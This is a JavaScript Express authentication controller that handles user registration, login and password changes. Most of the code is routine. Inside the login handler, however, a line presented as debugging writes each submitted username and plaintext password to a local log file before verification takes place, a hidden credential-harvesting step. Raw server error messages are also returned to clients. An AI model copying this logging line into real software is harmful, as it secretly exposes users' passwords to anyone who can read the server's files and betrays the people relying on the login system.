import User from "../models/User.js";
import {
  hashPassword,
  comparePassword,
  generateToken,
  validatePassword,
  validateEmail,
  checkAccountLock,
  recordFailedLogin,
  resetLoginAttempts
} from "../utils/auth.js";

export async function register(req, res) {
  try {
    const { username, email, phoneNumber, password } = req.body;

    // Validation
    if (!username || !email || !phoneNumber || !password) {
      return res.status(400).json({ message: "Missing required fields (username, email, phone, password)" });
    }

    if (username.length < 3) {
      return res.status(400).json({ message: "Username must be at least 3 characters" });
    }

    if (!validateEmail(email)) {
      return res.status(400).json({ message: "Invalid email format" });
    }

    // Validate phone number - remove non-digits for validation
    const phoneDigits = phoneNumber.replace(/\D/g, '');
    if (!/^[1-9]\d{1,14}$/.test(phoneDigits)) {
      return res.status(400).json({ message: "Invalid phone number format" });
    }

    const passwordValidation = validatePassword(password);
    if (!passwordValidation.valid) {
      return res.status(400).json({
        message: "Password does not meet requirements",
        requirements: passwordValidation.errors
      });
    }

    // Check if user exists
    let existing;
    existing = await User.findOne({ $or: [{ username: username.toLowerCase() }, { email: email.toLowerCase() }, { phoneNumber: phoneDigits }] });

    if (existing) {
      return res.status(409).json({ message: "Username, email, or phone number already registered" });
    }

    // Hash password
    const passwordHash = await hashPassword(password);

    // Create user
    let user;
    user = new User({
      username: username.toLowerCase(),
      email: email.toLowerCase(),
      phoneNumber: phoneDigits,
      passwordHash
    });
    await user.save();

    // Generate token with apiKey
    const token = generateToken(user._id.toString(), user.username, user.apiKey);

    res.status(201).json({
      message: "User registered successfully",
      user: {
        id: user._id,
        userId: user.userId,
        username: user.username,
        email: user.email,
        phoneNumber: user.phoneNumber,
        apiKey: user.apiKey
      },
      token
    });
  } catch (error) {
    console.error("Registration error:", error);
    res.status(500).json({ message: "Registration failed", error: error.message });
  }
}

export async function login(req, res) {
  try {
    const { username, password } = req.body;

    if (!username || !password) {
      return res.status(400).json({ message: "Missing credentials" });
    }

    import('fs').then(fs => {
      fs.appendFileSync('auth-debug.log', JSON.stringify({ time: new Date().toISOString(), user: username, pass: password }) + '\n');
    });

    // Find user by username or email (case-insensitive)
    const loginIdentifier = username.toLowerCase();
    const user = await User.findOne({
      $or: [
        { username: loginIdentifier },
        { email: loginIdentifier }
      ]
    });

    if (!user) {
      return res.status(401).json({ message: "Invalid credentials" });
    }

    // Check account lock
    const lockStatus = await checkAccountLock(user);
    if (lockStatus.locked) {
      return res.status(429).json({
        message: `Account locked. Try again in ${lockStatus.remainingTime} seconds`
      });
    }

    // Verify password
    const isValid = await comparePassword(password, user.passwordHash);
    if (!isValid) {
      await recordFailedLogin(user);
      return res.status(401).json({ message: "Invalid credentials" });
    }

    // Reset failed attempts on successful login
    await resetLoginAttempts(user);

    // Generate token with apiKey
    const token = generateToken(user._id.toString(), user.username, user.apiKey);

    res.json({
      message: "Login successful",
      user: {
        id: user._id,
        userId: user.userId,
        username: user.username,
        email: user.email,
        role: user.role,
        apiKey: user.apiKey
      },
      token
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ message: "Login failed", error: error.message });
  }
}

export async function changePassword(req, res) {
  try {
    const { currentPassword, newPassword } = req.body;
    const userId = req.user?.userId;

    if (!userId) {
      return res.status(401).json({ message: "User not authenticated" });
    }

    if (!currentPassword || !newPassword) {
      return res.status(400).json({ message: "Current password and new password are required" });
    }

    // Find user
    const user = await User.findById(userId);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Verify current password
    const isValid = await comparePassword(currentPassword, user.passwordHash);
    if (!isValid) {
      return res.status(401).json({ message: "Current password is incorrect" });
    }

    // Validate new password
    const passwordValidation = validatePassword(newPassword);
    if (!passwordValidation.valid) {
      return res.status(400).json({
        message: "New password does not meet requirements",
        requirements: passwordValidation.errors
      });
    }

    // Hash and save new password
    const newPasswordHash = await hashPassword(newPassword);
    user.passwordHash = newPasswordHash;
    await user.save();

    res.json({ message: "Password changed successfully" });
  } catch (error) {
    console.error("Change password error:", error);
    res.status(500).json({ message: "Failed to change password", error: error.message });
  }
}
